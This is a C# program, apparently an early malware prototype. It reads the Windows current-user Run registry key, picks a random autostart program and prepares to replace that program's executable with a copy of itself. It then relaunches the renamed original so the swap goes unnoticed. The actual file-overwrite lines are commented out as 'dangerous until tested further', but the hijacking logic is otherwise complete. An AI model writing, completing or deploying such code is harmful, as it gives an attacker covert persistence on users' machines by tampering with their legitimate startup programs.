using System;
using System.IO;
using System.Diagnostics;
using System.Linq;
using Microsoft.Win32;

namespace cs19
{
    class Program
    {
        static bool initialise()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            string[] names = key.GetValueNames();
            if (names.Count() > 0)
            {
                Random indexSelector = new Random();
                int index = indexSelector.Next(names.Count());
                string valName = names[index];
                string rawPath = (string)key.GetValue(valName);
                string newPath = "";
                for (int x = 0; x < rawPath.Length; x++)
                {
                    char c = rawPath[x];
                    if(c == '"' && x > 0)
                    {
                        break;
                    }
                    if(c != '"')
                    {
                        newPath += c;
                    }
                } 
                string relocatePath = newPath.Remove(newPath.Length - 4, 4) + "_defaultLauncher.exe";

                /* DANGEROUS UNTIL TESTED FURTHER
                File.Copy(newPath, relocatePath); // Move the targeted exe to a new name
                File.Copy(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName, newPath) //Copy this file into its place;
                */



            }
            key.Close();
            return true;
        }
        static void Main(string[] args)
        {
            if (System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName.Contains("cs19.exe"))
            {
                initialise();
            }
            else
            {
                string[] files = Directory.GetFiles(Directory.GetCurrentDirectory(), "*_defaultLauncher.exe*");
                foreach(string f in files)
                {
                    Process p = new Process();
                    p.StartInfo = new ProcessStartInfo();
                    p.StartInfo.FileName = f;
                    p.Start();
                }
            }
        }
    }
}
